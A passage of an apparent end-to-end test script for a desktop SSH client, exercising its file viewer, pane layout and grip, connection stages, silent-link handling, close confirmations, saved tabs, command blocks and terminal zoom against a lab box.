            // And it really stopped: the box is no longer being asked for pages of the folder left behind.
            // Without that it would be read to its end for nobody, which on a real folder of a hundred
            // thousand files is minutes of a box's time and the tab's own channel.
            // The folder now on screen is listed too, and its own pages count, so this waits until nothing at
            // all is being read before it starts counting.
            const settled = await until(async () => !(await js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`)).includes('reading'), 15_000);
            const pagesThen = Number((await lab.tell('pages'))['pages'] ?? 0);
            await sleep(1500);
            const pagesNow = Number((await lab.tell('pages'))['pages'] ?? 0);
            check('and the box is no longer being asked for its pages', settled && pagesNow === pagesThen, [settled, pagesThen, pagesNow]);
            await lab.tell('filepace 0');
          }

          // Double-click a file: the read-only viewer, with its text, a search through it and zoom. Nothing
          // in it edits and nothing is ever written back to a box.
          {
            await lab.tell('filepace 0');
            await js(front.view, `document.querySelector('[data-name="syslog"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            const opened = await until(async () => (await js<string>(front.view, `document.getElementById('vw-body')?.textContent ?? ''`)).includes("the box's own log"), 10_000);
            check('double-clicking a file opens it in the viewer, with the file\'s own text', opened, await js<string>(front.view, `document.getElementById('vw-body')?.textContent ?? ''`));
            check('and the viewer names the file and says how big it is', (await js<string>(front.view, `document.getElementById('vw-title')?.textContent ?? ''`)) === 'syslog' && (await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`)).includes('lines'), await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`));

            // The search marks what it finds and says how many.
            await js(front.view, `(() => { const s = document.getElementById('vw-search'); s.value = 'log'; s.dispatchEvent(new Event('input', { bubbles: true })); })()`);
            const marked = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#vw-body .vw-hit').length`)) > 0, 4000);
            check('the search marks every match and says which one is in view', marked && /\d+ of \d+/.test(await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`)), await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`));

            // Zoom changes the size of what is drawn, and nothing else.
            const was = await js<string>(front.view, `getComputedStyle(document.getElementById('vw-body')).fontSize`);
            await clickOn('#vw-in', front);
            const now = await js<string>(front.view, `getComputedStyle(document.getElementById('vw-body')).fontSize`);
            check('zoom makes the file bigger', parseFloat(now) > parseFloat(was), [was, now]);
            await shot('viewer', 'a file from the box, read-only, with a search through it', front);

            // Nothing about the file on the box changed: the viewer only ever reads.
            const after = await lab.tell('pages');
            check('the box was never asked to change anything by the viewer', typeof after['pages'] === 'number', after);
            await clickOn('#vw-close', front);
            check('the viewer closes and leaves the folder as it was', await until(async () => !(await js<boolean>(front.view, `document.getElementById('viewer') !== null`)), 4000), '');

            // A file larger than the viewer reads: what is past the cap is never read at all, and the viewer
            // says so rather than pretending it has the whole file.
            {
              const big = await lab.tell('bigfile /var/log/huge.log 3145728');
              check('the lab wrote a file larger than the viewer will read', big['bytes'] === 3_145_728, big);
              await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 8000);
              await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('huge.log'), 8000);
              await js(front.view, `document.querySelector('[data-name="huge.log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              const read = await until(async () => (await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`)).includes('only'), 25_000);
              const foot = await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`);
              const drawn = await js<number>(front.view, `document.getElementById('vw-body')?.textContent?.length ?? 0`);
              check('a file larger than the viewer reads is cut, and the viewer says so', read && foot.includes('2.1 MB only') && drawn > 1_000_000 && drawn < 2_300_000, [foot, drawn]);
              await clickOn('#vw-close', front);
            }

            // A file that is not text says so rather than drawing a screenful of nonsense.
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 8000);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('kit.tar.gz'), 8000);
            await js(front.view, `document.querySelector('[data-name="kit.tar.gz"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            check('a file that is not text says so, and is not drawn', await until(async () => has('#vw-not-text', front), 10_000), (await js<string>(front.view, `(document.getElementById('vw-body')?.textContent ?? '').slice(0, 120)`)));
            await clickOn('#vw-close', front);
            // Back where the rest of this expects to be.
            await js(front.view, `document.querySelector('[data-name="var"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 8000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log'), 8000);
          }

          // And the terminal on the same link is untouched by any of it.
          await type(front, 'echo files-did-not-block\n');
          check('the terminal on the same link is untouched by the file browser', await until(async () => (await shown(front)).includes('files-did-not-block'), 10_000), '');
          await shot('files', 'a tab: its box\'s files beside its terminal', front);
        }

        // ---- A box that says nothing at sign-in gives its window no band of empty room. ----
        // Nearly every real box is quiet at sign-in; the lab's is not, which is how a band of empty window
        // above both panes went unseen on every picture ever taken. The slot a box's words land in used to
        // keep its height whether or not there were any, so his own boxes cost him 46 pixels of window on
        // every tab, all day.
        {
          await lab.tell('banner');
          const quiet = ctx.openTab(id, 'logs')!;
          check('a tab on a box that says nothing at sign-in comes up', await until(() => quiet.engine.state === 'ready' && quiet.engine.link.phase === 'up', 20_000), quiet.engine.link.phase);
          await js<void>(quiet.view, `new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(() => r())))`);
          const said = await js<string>(quiet.view, `document.getElementById('signin-at')?.dataset.said ?? 'missing'`);
          const room = await js<number>(quiet.view, `Math.round(document.getElementById('signin-at')?.getBoundingClientRect().height ?? -1)`);
          const top = await js<number>(quiet.view, `Math.round(document.getElementById('split')?.getBoundingClientRect().top ?? -1)`);
          check('it is marked as having said nothing, and the slot for its words takes no room', said === 'no' && room === 0, { said, room });
          check('so the two panes start at the top of the tab, with no band above them', top === 0, top);
          await shot('quiet-sign-in', 'a tab on a box that says nothing at sign-in, which is every box he owns', quiet);

          // ---- Two panes, each one a thing of its own, with a grip between them. ----
          // Side by side with MobaXterm he said the two looked like tabs leaning on each other with no weight,
          // that neither said what it was, that they wore one theme, and that he could not give either of them
          // more room. Each has a head that names it now, the files are the lighter surface and the terminal
          // the deeper one, and the grip answers the hand and the keyboard.
          // What a head says it is, which is its own name and not the readouts beside it: the terminal's head
          // also carries how large its letters are and, on a machine with no graphics renderer, that.
          const heads = await js<string[]>(quiet.view, `['files-head', 'term-head'].map((id) => [...(document.getElementById(id)?.children ?? [])].filter((e) => e.id === '' && e.tagName === 'SPAN').map((e) => e.textContent ?? '').join(' '))`);
          const glyphs = await js<number>(quiet.view, `document.querySelectorAll('#files-head .pane-glyph, #term-head .pane-glyph').length`);
          check('each pane has a head that says what it is, glyph first', heads[0]?.trim() === 'Files' && heads[1]?.trim() === 'Terminal' && glyphs === 2, [heads, glyphs]);
          const skins = await js<string[]>(quiet.view, `['files-pane', 'term-pane'].map((id) => getComputedStyle(document.getElementById(id)).backgroundColor)`);
          check('and the two do not wear one surface: the files are the lighter side, the terminal the deeper', skins[0] !== skins[1], skins);
          // The grip, by hand: taken at its own middle and dragged left, it gives the terminal the room and
          // the box is told the size it really has now.
          const wide = async () => js<number>(quiet.view, `Math.round(document.getElementById('files-pane').getBoundingClientRect().width)`);
          const colsNow = async () => js<number>(quiet.view, `window.berthTerm.size().cols`);
          const was = await wide();
          const colsWas = await colsNow();
          await js(quiet.view, `(() => { const g = document.getElementById('grip'); const b = g.getBoundingClientRect(); const at = (x) => ({ bubbles: true, button: 0, pointerId: 1, clientX: x, clientY: b.top + b.height / 2 }); g.dispatchEvent(new PointerEvent('pointerdown', at(b.left + 4))); g.dispatchEvent(new PointerEvent('pointermove', at(b.left - 120))); g.dispatchEvent(new PointerEvent('pointerup', at(b.left - 120))); })()`);
          const dragged = await until(async () => (await wide()) < was - 80, 3000) ? await wide() : await wide();
          const colsDragged = await until(async () => (await colsNow()) > colsWas, 3000) ? await colsNow() : await colsNow();
          check(`the grip gives the terminal the room: the files went from ${was} to ${dragged} and the terminal from ${colsWas} to ${colsDragged} columns`, dragged < was - 80 && colsDragged > colsWas, [was, dragged, colsWas, colsDragged]);
          // And by the keyboard, because a thing that can only be dragged cannot be moved at all without a mouse.
          await js(quiet.view, `document.getElementById('grip').focus()`);
          const focused = await js<string>(quiet.view, `document.activeElement?.id ?? ''`);
          await js(quiet.view, `document.getElementById('grip').dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowRight', shiftKey: true, bubbles: true }))`);
          const byKey = await until(async () => (await wide()) > dragged + 40, 3000) ? await wide() : await wide();
          check('and the keyboard moves it too, with the grip reachable by Tab', focused === 'grip' && byKey > dragged + 40, [focused, dragged, byKey]);
          // Put back where a tab starts, which is the way out of any corner it was dragged into.
          await js(quiet.view, `document.getElementById('grip').dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }))`);
          check('and a press puts it back where a tab starts', await until(async () => Math.abs((await wide()) - was) < 3, 3000), [was, await wide()]);
          // And the way back out really is a way out: the next key must step from where the grip now stands,
          // not from the corner it was just taken out of. Taking the width off the pane and leaving the share
          // the grip was holding put the very next arrow key straight back in that corner.
          await js(quiet.view, `document.getElementById('grip').dispatchEvent(new KeyboardEvent('keydown', { key: 'End', bubbles: true }))`);
          await until(async () => (await wide()) > was + 80, 3000);
          const corner = await wide();
          await js(quiet.view, `document.getElementById('grip').dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
          await until(async () => Math.abs((await wide()) - was) < 3, 3000);
          const back = await wide();
          await js(quiet.view, `document.getElementById('grip').dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowLeft', bubbles: true }))`);
          await sleep(200);
          const afterKey = await wide();
          const announced = await js<string>(quiet.view, `document.getElementById('grip')?.getAttribute('aria-valuenow') ?? ''`);
          check(`the next key steps from where it stands, not from the corner: ${corner} in the corner, ${back} put back, ${afterKey} after one step left, announcing ${announced}`, Math.abs(back - was) < 3 && afterKey < back && afterKey > was - 40 && announced !== '', [was, corner, back, afterKey, announced]);
          await js(quiet.view, `document.getElementById('grip').dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
          // And the same box, having something to say, still says it: the slot is collapsed, not removed.
          await lab.tell('banner this box has something to say');
          const loud = ctx.openTab(id, 'logs')!;
          check('a tab on the same box, now with something to say, comes up', await until(() => loud.engine.state === 'ready' && loud.engine.link.phase === 'up', 20_000), loud.engine.link.phase);
          await until(async () => (await js<string>(loud.view, `document.getElementById('signin-at')?.dataset.said ?? ''`)) === 'yes', 8000);
          const saidLoud = await js<string>(loud.view, `document.getElementById('signin-at')?.dataset.said ?? 'missing'`);
          const roomLoud = await js<number>(loud.view, `Math.round(document.getElementById('signin-at')?.getBoundingClientRect().height ?? -1)`);
          const words = await js<string>(loud.view, `document.getElementById('signin-at')?.textContent ?? ''`);
          // Folded, as it always is: the line says who said it and how much, and the words themselves are
          // behind it until he opens them. What this holds is that the slot takes its room back to show it.
          check('what the box said is shown, and the slot takes its room back to show it', saidLoud === 'yes' && roomLoud > 0 && words.includes('said 1 line at sign-in'), { saidLoud, roomLoud, words });
          // And a box that prints newlines and no words has said nothing. Folding a box's words drops blank
          // lines and hands back an object either way, so "is there something to fold" counted this as having
          // spoken: the band came back whole and told him the box had said nothing in it.
          await lab.tell('banner \\n\\n\\n');
          const blank = ctx.openTab(id, 'logs')!;
          check('a tab on a box whose sign-in text is only blank lines comes up', await until(() => blank.engine.state === 'ready' && blank.engine.link.phase === 'up', 20_000), blank.engine.link.phase);
          await js<void>(blank.view, `new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(() => r())))`);
          await sleep(300);
          const blankSaid = await js<string>(blank.view, `document.getElementById('signin-at')?.dataset.said ?? 'missing'`);
          const blankRoom = await js<number>(blank.view, `Math.round(document.getElementById('signin-at')?.getBoundingClientRect().height ?? -1)`);
          check('blank lines are not words: it costs the window no room either', blankSaid === 'no' && blankRoom === 0, { blankSaid, blankRoom });
          ctx.closeTab(blank.id);
          ctx.closeTab(quiet.id);
          ctx.closeTab(loud.id);
          await lab.tell('banner');
        }

        const open1 = [...ctx.tabs.values()].find((x) => x.place === 'logs')!;
        {
          const front = open1;
          const worn = await dress(front);
          check('the tab\'s page is whole: stylesheets, typeface, the terminal\'s own text field out of sight', dressed(worn), worn);
          await js<void>(front.view, `new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(() => r())))`);
        }
        await shot('tab-open', 'a tab open on a box');

        // ---- Where a link stands, as the four approved pictures show it. ----
        // A tab opening: the box takes the connection, agrees keys, and then answers nothing, so the stages
        // stand still at "signing in" and can be seen and pictured.
        await lab.tell('stall on');
        const slowTab = ctx.openTab(id, 'logs')!;
        const sawStages = await until(() => slowTab.engine.link.phase === 'signing-in', 20_000);
        await sleep(250);
        const rows = await js<string[]>(slowTab.view, `[...document.querySelectorAll('.opening li')].map((l) => l.dataset.mark + '|' + l.textContent)`);
        const stages = await text('.opening', slowTab);
        check('a tab opening lists its stages: connected, identity, keys, signing in, shell', sawStages && stages.includes(`Connected to ${addr}`) && stages.includes('Identity matches the one pinned for lab-box') && stages.includes('Keys agreed, post-quantum') && stages.includes('Signing in as demo with Berth') && stages.includes('Shell in /var/log'), stages.slice(0, 300));
        // Each stage says where it stands: what is done, what is happening now, what has not begun.
        check('each stage says where it stands: done, now, or not begun', JSON.stringify(rows.map((r) => r.split('|')[0])) === JSON.stringify(['done', 'done', 'done', 'now', 'waiting']), rows);
        check('what is done carries what it found: how long the connection took, and this box\'s own pinned kind of identity', /^done\|Connected to .*\d+ ms$/.test(rows[0] ?? '') && (rows[1] ?? '').endsWith('ED25519'), rows.slice(0, 2));
        // What it says of the link is the link's own. Said plainly: the key exchange and cipher are named once
        // the link is up, not while signing in: the library tells what was agreed only when it hands the link
        // over, a fraction of a second later. The approved picture shows them beside "Keys agreed"; on a box
        // that answers they are there before anyone can read the line, and only a stalled box shows it bare.
        check('the bar marks the tab whose view is in front, and only that one', (await js<string>(ctx.shell, `[...document.querySelectorAll('[data-tab]')].filter((e) => e.getAttribute('aria-selected') === 'true').map((e) => e.dataset.tab).join(',')`)) === String(ctx.shellState().active), [await js<string>(ctx.shell, `[...document.querySelectorAll('[data-tab]')].map((e) => e.dataset.tab + ':' + e.getAttribute('aria-selected')).join(' ')`), ctx.shellState().active]);
        await shot('tab-opening', 'a tab opening: the stages', slowTab);
        await lab.tell('stall off');
        ctx.closeTab(slowTab.id);

        // A link that goes silent: the bar says so with the seconds counting, the link is kept, and when the
        // box speaks again the same shell is there, with what it printed meanwhile.
        const marker = 'still-the-same-shell-' + String(Date.now()).slice(-5);
        await type(open1, `echo ${marker}\n`);
        await until(async () => (await shown(open1)).includes(marker), 5000);
        // A few lines of a job's output, so the pictures show a terminal with something in it, and the bars
        // can be judged where they really lie: over the first rows of what the box printed.
        const job = [
          '\u001b[2m2026-11-16 08:41:02\u001b[0m check    on main, all green',
          '\u001b[2m2026-11-16 08:41:06\u001b[0m build    image ledger:4f2c1a9',
          '  => [build 4/9] RUN npm ci --ignore-scripts            21.4s',
          '  => [build 6/9] RUN npm run build                      38.9s',
          '  => exporting layers                                    2.2s',
          '\u001b[32m2026-11-16 08:42:07\u001b[0m migrate  041_invoice_batches.sql applied (1 of 1)\u001b[0m',
          '\u001b[2m2026-11-16 08:42:09\u001b[0m swap     ledger-app-2 started, waiting for health',
          '          health 1/10  503 starting',
          '          health 2/10  503 starting',
          '\u001b[32m          health 3/10  200 ok\u001b[0m',
          '\u001b[2m2026-11-16 08:42:38\u001b[0m swap     routing to ledger-app-2',
          '\u001b[2m2026-11-16 08:42:39\u001b[0m check    public site answers 200 in 212 ms',
          '\u001b[2m2026-11-16 08:42:40\u001b[0m tools    collector, backup, restore test: timers installed',
          '                   stopping ledger-app-1 (30 s grace)',
        ].join('\r\n') + '\r\n';
        await lab.tell(`print ${Buffer.from(job, 'latin1').toString('hex')}`);
        await until(async () => (await shown(open1)).includes('stopping ledger-app-1'), 5000);
        await lab.tell('hold 9000');
        const sawQuiet = await until(async () => (await text('#bar', open1)).includes('No answer for'), 20_000);
        const quietSaid = await text('#bar', open1);
        check('a link that goes silent: the bar counts the seconds and says the link is kept', sawQuiet && /No answer for [1-9]\d? s\./.test(quietSaid) && quietSaid.includes('The link is kept') && quietSaid.includes('Reconnect'), quietSaid);
        check('and the terminal is still readable, with everything the box printed before the silence', (await shown(open1)).includes(marker) && (await shown(open1)).includes('stopping ledger-app-1'), '');
        await shot('tab-quiet', 'no answer: the link is kept', open1);
        // The one fact in the status line he has to notice. It takes the place the round trip had rather
        // than standing beside it, because a round trip measured before the silence began is a number that
        // is true of a moment that has passed, and two numbers side by side is exactly what reading a
        // status line at a glance cannot survive.
        {
          const f = await js<{ id: string; text: string; colour: string }[]>(ctx.shell, `[...document.querySelectorAll('#status .s-f')].map((e) => ({ id: e.id, text: (e.textContent || '').trim(), colour: getComputedStyle(e).color }))`);
          const quiet = f.find((x) => x.id === 'status-quiet');
          const problem = await js<string>(ctx.shell, `getComputedStyle(document.documentElement).getPropertyValue('--problem').trim()`);
          check('a silent link takes the status line\'s number away and counts in its place, in the colour the connection mark uses for it',
            !!quiet && /^[1-9]\d* s quiet$/.test(quiet.text) && !f.some((x) => x.id === 'status-rtt') && quiet.colour === hexToRgb(problem),
            [f, problem]);
        }
        const backOk = await until(() => open1.engine.link.phase === 'up' && open1.engine.link.silentSinceMs === 0, 30_000);
        await type(open1, `echo after-${marker}\n`);
        check('when the box speaks again the bar is gone, the same session answers, and nothing was reconnected', backOk && (await until(async () => (await shown(open1)).includes(`after-${marker}`), 5000)) && !(await has('#bar', open1)) && open1.engine.link.phase === 'up', [open1.engine.link.phase, await text('#bar', open1)]);

        // Closing ends a session, so it asks first and names what would end (BUILD-RULES 2.20). The tab open
        // here is signed in: closing it, and closing the window, both have something to lose.
        {
          const live = open1;
          await clickOn(`[data-close="${live.id}"]`);
          const asked = await until(() => has('#closing'), 3000);
          const goes = await text('#closing-goes');
          check('closing a tab with a session on it asks first, naming the box and where it stands', asked && goes.includes('lab-box') && (goes.includes('connected') || goes.includes('not answering')) && ctx.tabs.has(live.id), [goes, ctx.tabs.has(live.id)]);
          check('the way out has the focus, so Enter keeps the tab', (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'closing-keep', await js<string>(ctx.shell, `document.activeElement?.id ?? ''`));
          await shot('closing-tab', 'closing a tab with a session on it');
          await clickOn('#closing-keep');
          check('Keep the tab: it is still open and its session is untouched', (await until(async () => !(await has('#closing')), 2000)) && ctx.tabs.has(live.id) && ctx.tabs.get(live.id)!.engine.link.phase === 'up', ctx.tabs.get(live.id)?.engine.link.phase);

          // The window's own close goes the same way, and must not close while the question stands.
          ctx.win.close();
          const askedApp = await until(async () => (await has('#closing')) && ctx.shellState().closing !== null, 3000);
          check('closing the window asks too, and the window does not close while it is asking', askedApp && !ctx.win.isDestroyed() && (await text('#closing-title')).includes('Close Berth'), [askedApp, await text('#closing-title')]);
          check('and it names the session that would end', (await text('#closing-goes')).includes('lab-box'), await text('#closing-goes'));
          await shot('closing-app', 'closing Berth with a session open');
          await clickOn('#closing-keep');
          check('Keep Berth open: the window and its session are still here, and the footer says so', (await until(async () => !(await has('#closing')), 2000)) && !ctx.win.isDestroyed() && ctx.tabs.has(live.id) && (await text('#status-done')).includes('kept open'), await text('#status-done'));
        }

        // The morning (his own words 2026-11-15): the app starts with nothing open and offers what was open
        // last time, to pick from. What is written down is proved on the real path; the offer itself is
        // proved by putting the window in the state a fresh start would be in.
        {
          const open = [...ctx.tabs.values()].filter((t) => t.box);
          const wrote = await until(() => ctx.boxes.lastTabs.length === open.length && ctx.boxes.lastTabs.every((l, i) => l.box === open[i]?.box?.id && l.place === open[i]?.place), 15_000);
          check('what is open is written down inside the locked list, as the tabs stand', wrote, [ctx.boxes.lastTabs, open.map((t) => [t.box?.id, t.place])]);
          // Where it is kept: inside the locked list, and nowhere else in the clear. A box's id may also be
          // in the local log, which is what that log names a box by and is meaningless without the list;
          // what must not be anywhere outside the list is the place, which is a word he chose and says what
          // he works on.
          const id = ctx.boxes.lastTabs[0]?.box ?? 'nothing-of-the-sort';
          const place = ctx.boxes.lastTabs.map((l) => l.place).find((p) => p !== '') ?? '';
          const holdingId = await filesHolding(id);
          const allowed = (f: string) => f === ctx.listFile || f.includes('backup') || f.endsWith('.bak') || f.endsWith('faults.log');
          const holdingPlace = place === '' ? [] : (await filesHolding(`"place":"${place}"`));
          check('what was open is kept inside the locked list: the box only by an id, and the place nowhere else at all', holdingId.every(allowed) && holdingPlace.every((f) => f === ctx.listFile || f.includes('backup')), [holdingId, holdingPlace, place]);
        }

        // Reading this box's prompt, and what that is for: the mark on a tab he is not looking at, and the
        // one notification when something long ends behind his back. The lab's box is made to behave like a
        // shell that prompts for this: the app's own reading of a prompt has its own tests (tests/blocks),
        // and what is proved here is the whole way through, from a box's bytes to a mark on the bar.
        {
          // What the window has been told about one tab: the shell's own state, which is the same object the
          // bar draws from, so a probe never reads anything the window does not.
          const infoOf = (id: number) => ctx.shellState().tabs.find((t) => t.id === id);
          const prompt = 'demo@lab-box:/srv/ledger$ ';
          await lab.tell(`prompting ${prompt}`);
          // A second tab on the same box, so one can be behind while the other is in front.
          const behind = ctx.openTab(open1.box!.id, '')!;
          await until(() => behind.engine.link.phase === 'up', 30_000);
          // Its shell prints the prompt; the app learns it from that one line and says it is waiting.
          await type(behind, '\n');
          const learned = await until(() => ctx.tabs.get(behind.id) !== undefined && infoOf(behind.id)?.doing === 'idle', 15_000);
          check('a tab reads its own box’s prompt and says it is waiting at it', learned && infoOf(behind.id)?.doing === 'idle', [learned, infoOf(behind.id)?.doing]);
          // Something that takes a moment: the tab says it is running, and the bar draws that on it. The
          // tab in front is the other one, so this is a tab he is not looking at.
          await js(ctx.shell, `document.querySelector('[data-tab="${open1.id}"]')?.click()`);
          await until(() => ctx.shellState().active === open1.id, 5000);
          await type(behind, 'slow-one\n');
          const ran = await until(() => infoOf(behind.id)?.doing === 'running', 10_000);
          const clock = await until(async () => (await js<string>(ctx.shell, `document.querySelector('[data-tab="${behind.id}"] .sig-running') ? 'yes' : 'no'`)) === 'yes', 10_000);
          check('something running in a tab he is not looking at: the tab says so, and the bar marks it with a clock', ran && clock, [infoOf(behind.id)?.doing, clock]);
          await shot('tab-running', 'a tab behind with something running in it', open1);
          // And when it finishes, the mark becomes how long it took, which is what he asked to be told.
          const done = await until(() => (infoOf(behind.id)?.finishedMs ?? 0) > 0, 15_000);
          const said = await js<string>(ctx.shell, `document.querySelector('[data-tab="${behind.id}"] .sig-done')?.textContent ?? ''`);
          check('a command that finished in a tab behind: the tab says how long it took, and the bar says it too', done && /^\d+s$/.test(said.trim()) && (infoOf(behind.id)?.doing === 'idle'), [infoOf(behind.id)?.finishedMs, said, infoOf(behind.id)?.doing]);
          await shot('tab-marks', 'a tab behind: something ran in it and how long it took', open1);
          // Looking at the tab is the answer to its mark: it goes, with no press of its own.
          await js(ctx.shell, `document.querySelector('[data-tab="${behind.id}"]')?.click()`);
          const cleared = await until(() => (infoOf(behind.id)?.finishedMs ?? 0) === 0 && infoOf(behind.id)?.unseen === false, 5000);
          check('looking at the tab clears what it had to say, with no press of its own', cleared, [infoOf(behind.id)?.finishedMs, infoOf(behind.id)?.unseen]);
          // One command and its output told from the next: the prompt in the box's own colour and a hairline
          // where each block begins. It is the thing he said matters most about a terminal, because with
          // everything one colour he cannot see where one command's output ends (2026-11-15 07:32).
          {
            await type(behind, 'first-one\n');
            await sleep(400);
            await type(behind, 'second-one\n');
            const blocks = await until(async () => (await js<number>(behind.view, `document.querySelectorAll('.berth-block-line').length`)) >= 2, 10_000);
            const howMany = await js<number>(behind.view, `document.querySelectorAll('.berth-block-line').length`);
            // The prompt itself is drawn in the box's colour, which is what tells it from output.
            const coloured = await js<string>(
              behind.view,
              `(() => { const el = [...document.querySelectorAll('.xterm-decoration')].find((e) => !e.classList.contains('berth-block-line') && getComputedStyle(e).color); return el ? getComputedStyle(el).color : 'none'; })()`,
            );
            const why = await js<string>(behind.view, `(document.documentElement.dataset.blocks ?? '') + ' | marks ' + (document.querySelectorAll('.xterm-decoration').length)`);
            check('each command and its output is a block: a hairline where it begins, and the prompt in the box\u2019s own colour', blocks && howMany >= 2 && coloured !== 'none', [howMany, coloured, why]);
            // And the one press a block answers: it copies what that command printed, and nothing else.
            const before = await js<string>(behind.view, `document.documentElement.dataset.copied ?? ''`);
            // The mark on the block before the last: the last one is the prompt he is sitting at, which has
            // printed nothing yet, and a probe that presses that proves nothing about copying output.
            await js(behind.view, `[...document.querySelectorAll('.berth-block-copy')].at(-2)?.click()`);
            await until(async () => (await js<string>(behind.view, `document.documentElement.dataset.copied ?? ''`)) !== before, 5000);
            const did = await js<string>(behind.view, `document.documentElement.dataset.copied ?? ''`);
            const onClipboard = await clipboard.readText();
            check('one press on a block copies what that command printed, and nothing of the command itself', did === 'copied' && onClipboard.includes('nothing was run') && !onClipboard.includes('demo@lab-box'), [did, onClipboard.slice(0, 120)]);
            // The terminal's own size (his 13: "no zoom in/out in terminal at all"). The press is the
            // window's own, and it is held on all four things at once: the letters really grow, the box is
            // told the new size in cells, the head says what size it is at, and nothing of the press reaches
            // the shell. That last one is the standing rule of this whole app, and Ctrl with a minus is a
            // character a box would otherwise be sent.
            {
              const look = (): Promise<{ px: number; cols: number; said: string; hidden: boolean }> => js(behind.view, `(() => {
                const z = document.getElementById('term-zoom');
                const s = window.berthTerm.size();
                return { px: Number(getComputedStyle(document.querySelector('.xterm-rows')).fontSize.replace('px', '')), cols: s.cols, said: z?.textContent ?? '', hidden: !!z?.hidden };
              })()`);
              const w = behind.view.webContents;
              const press = async (key: string) => {
                w.sendInputEvent({ type: 'keyDown', keyCode: key, modifiers: ['control'] });
                w.sendInputEvent({ type: 'char', keyCode: key, modifiers: ['control'] });
                w.sendInputEvent({ type: 'keyUp', keyCode: key, modifiers: ['control'] });
                await sleep(260);
              };
              await js(behind.view, `window.berthTerm.focus()`);
              await sleep(120);
              // What reached the shell is asked of the box itself, which hands back the bytes it was given
              // and forgets them. Comparing what is on screen cannot do this: the lab's shell answers a
              // control character with nothing printed, so the screen reads the same either way and a probe
              // built on it holds nothing at all. Drained first, so what comes back is these presses alone.
              await lab.tell('received');
              const typedNothing = async (): Promise<string> => {
                await sleep(250);
                return Buffer.from(String((await lab.tell('received'))['hex'] ?? ''), 'hex').toString('latin1');
              };
              const own = await look();
              await press('=');
              await press('=');
              const bigger = await look();
              check('Ctrl and plus makes the terminal\u2019s letters bigger, tells the box the new size in cells, and says what size it is at',
                bigger.px > own.px && bigger.cols < own.cols && !bigger.hidden && /^1[1-9]\d%$|^\d{3}%$/.test(bigger.said), [own, bigger]);
              // The box hands back what it was given and forgets it, so it is read once and held, never
              // once for the claim and again for the detail: that reads empty on the failure it explains.
              await shot('term-zoom', 'the terminal at its own size and larger, by the same keys as the list', behind);
              const gotBigger = await typedNothing();
              check('and not one byte of those presses reached the shell', gotBigger === '', JSON.stringify(gotBigger));
              // Ctrl with a minus is the one of the three that a terminal library may turn into a character
              // for the box, so it is pressed here too rather than only the two that are harmless.
              await press('-');
              const smaller = await look();
              check('Ctrl and minus makes them smaller again', smaller.px < bigger.px, [bigger, smaller]);
              const gotSmaller = await typedNothing();
              check('and that press sent the box no more than the others did', gotSmaller === '', JSON.stringify(gotSmaller));
              await press('0');
              const back = await look();
              check('Ctrl and nought puts it back to its own size, and the head stops saying one',
                Math.abs(back.px - own.px) < 0.6 && back.cols === own.cols && back.hidden, [own, back]);
              const gotOwn = await typedNothing();
              check('and still not one byte of it reached the shell', gotOwn === '', JSON.stringify(gotOwn));
            }
            await shot('blocks', 'one command and its output told from the next', behind);
          }

          // The one notification he asked for: something that took a while ended in a tab he is not looking
          // at, while the window itself was not in front. Whether this machine can draw one is the
          // machine's business; what is held here is main's decision to tell him, and when it does not.
          {
            const behindTab = behind.id;
            // The other tab is brought to the front first: this one has to be a tab he is not looking at,
            // and the probe before this one left it in front to see its mark cleared.
            await js(ctx.shell, `document.querySelector('[data-tab="${open1.id}"]')?.click()`);
            await until(() => ctx.shellState().active === open1.id, 5000);
            ctx.win.blur();
            await sleep(150);
            const before = ctx.told().decided;
            await js(behind.view, `window.tabPort.doing('idle', 95000)`);
            await sleep(300);
            const toldHim = ctx.told().decided;
            // The window in front: he is at the machine, so the tab's own mark is the whole of it.
            ctx.win.focus();
            await sleep(250);
            await js(behind.view, `window.tabPort.doing('idle', 95000)`);
            await sleep(300);
            const afterFocus = ctx.told().decided;
            // Short, and in a tab behind: a command that took a moment is not news.
            ctx.win.blur();
            await sleep(150);
            await js(behind.view, `window.tabPort.doing('idle', 1500)`);
            await sleep(300);
